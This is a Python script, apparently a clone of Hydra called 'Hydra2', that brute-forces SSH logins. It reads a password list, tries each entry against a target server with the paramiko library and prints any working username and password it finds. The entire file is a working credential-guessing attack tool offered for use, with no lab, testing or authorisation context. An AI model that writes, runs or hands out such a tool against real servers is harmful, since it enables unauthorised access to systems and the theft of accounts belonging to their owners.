import argparse
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException
import sys

def ssh_bruteforce(target_ip, username, password_file):
    """
    Attempts to brute force SSH login using the provided username and password list.

    Args:
        target_ip (str): The target IP address.
        username (str): The SSH username.
        password_file (str): Path to the password file.
    """
    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[!] Password file '{password_file}' not found.")
        sys.exit(1)

    print(f"[*] Starting SSH brute force on {target_ip} with username '{username}'")

    for password in passwords:
        password = password.strip()

        try:
            print(f"[*] Trying password: {password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=3)

            print(f"[+] Success! Credentials found: {username}:{password}")
            client.close()
            return

        except AuthenticationException:
            print(f"[-] Authentication failed for password: {password}")
        except SSHException as e:
            print(f"[!] SSH error: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

    print("[-] Brute force complete. No valid credentials found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Forcer (Hydra2)")
    parser.add_argument("-l", "--username", required=True, help="Username to use for SSH login")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file")
    parser.add_argument("target", help="Target SSH server (e.g., ssh://<target ip>)")

    args = parser.parse_args()

    # Parse the target IP from the target argument
    if args.target.startswith("ssh://"):
        target_ip = args.target.replace("ssh://", "")
    else:
        print("[!] Invalid target format. Use 'ssh://<target ip>'")
        sys.exit(1)

    ssh_bruteforce(target_ip, args.username, args.passwordlist)
